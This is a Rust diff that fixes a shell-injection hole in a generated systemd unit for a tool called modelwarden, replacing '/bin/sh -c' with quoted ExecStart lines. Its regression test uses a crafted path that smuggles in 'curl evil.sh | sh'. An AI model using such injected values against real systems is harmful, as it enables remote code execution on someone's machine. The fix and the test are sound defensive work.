@@ -30,19 +30,48 @@ pub fn unit_dir() -> PathBuf {
         .join("systemd/user")
 }
 
+/// One `ExecStart=` argument, quoted the way systemd parses it.
+///
+/// The unit used to be `/bin/sh -c '<path> hash && <path> verify --all'`
+/// with the path interpolated raw into a single-quoted shell string. A
+/// path holding an apostrophe broke the unit outright — anyone named
+/// O'Brien — and a path an attacker could influence (a shared /tmp
+/// build, a downloaded folder) ended a quote and ran whatever followed,
+/// on a timer, as the user. There is no shell here any more; this only
+/// has to survive systemd's own parser.
+fn systemd_quote(path: &Path) -> String {
+    let mut out = String::from("\"");
+    for c in path.to_string_lossy().chars() {
+        match c {
+            '"' | '\\' => {
+                out.push('\\');
+                out.push(c);
+            }
+            '\n' => out.push_str("\\n"),
+            _ => out.push(c),
+        }
+    }
+    out.push('"');
+    out
+}
+
 /// The two unit files, generated from the running binary's path so the
 /// timer survives however warden was installed.
 pub fn unit_files(warden_bin: &Path, calendar: &str) -> (String, String) {
+    // Type=oneshot runs several ExecStart lines in order and stops at the
+    // first failure, which is exactly what the old `&&` meant: verify
+    // must not run against a catalog that failed to refresh.
+    let bin = systemd_quote(warden_bin);
     let service = format!(
         "[Unit]\n\
          Description=modelwarden scrub: refresh catalog, re-verify every tracked byte\n\
          \n\
          [Service]\n\
          Type=oneshot\n\
-         ExecStart=/bin/sh -c '{bin} hash && {bin} verify --all'\n\
+         ExecStart={bin} hash\n\
+         ExecStart={bin} verify --all\n\
          Nice=10\n\
-         IOSchedulingClass=idle\n",
-        bin = warden_bin.display()
+         IOSchedulingClass=idle\n"
     );
     let timer = format!(
         "[Unit]\n\
@@ -145,7 +174,8 @@ mod tests {
     #[test]
     fn units_wire_the_binary_and_calendar_through() {
         let (service, timer) = unit_files(Path::new("/opt/warden"), "weekly");
-        assert!(service.contains("ExecStart=/bin/sh -c '/opt/warden hash && /opt/warden verify --all'"));
+        assert!(service.contains("ExecStart=\"/opt/warden\" hash\n"));
+        assert!(service.contains("ExecStart=\"/opt/warden\" verify --all\n"));
         assert!(service.contains("Type=oneshot"));
         assert!(
             service.contains("IOSchedulingClass=idle"),
@@ -154,5 +184,28 @@ mod tests {
         assert!(timer.contains("OnCalendar=weekly"));
         assert!(timer.contains("Persistent=true"), "missed runs catch up");
         assert!(timer.contains("WantedBy=timers.target"));
+    }
+
+    #[test]
+    fn no_shell_and_no_way_out_of_the_quotes() {
+        // The generated unit ran through /bin/sh with the binary's own
+        // path interpolated into a single-quoted string. An apostrophe
+        // broke it; a crafted path escaped it and ran commands on a
+        // timer, as the user.
+        let hostile = Path::new("/home/o'brien/x'; curl evil.sh | sh; '/warden");
+        let (service, _) = unit_files(hostile, "weekly");
+        assert!(!service.contains("/bin/sh"), "no shell to inject into");
+        assert!(!service.contains("curl evil.sh | sh\n"), "not a command of its own");
+        // Exactly two ExecStart lines, each one quoted argument plus verbs.
+        let execs: Vec<&str> = service
+            .lines()
+            .filter(|l| l.starts_with("ExecStart="))
+            .collect();
+        assert_eq!(execs.len(), 2);
+        assert!(execs[0].ends_with("\" hash"));
+        assert!(execs[1].ends_with("\" verify --all"));
+        // Quotes and backslashes in the path are escaped, not terminating.
+        let (svc, _) = unit_files(Path::new("/tmp/a\"b\\c/warden"), "weekly");
+        assert!(svc.contains("ExecStart=\"/tmp/a\\\"b\\\\c/warden\" hash\n"), "{svc}");
     }
 }
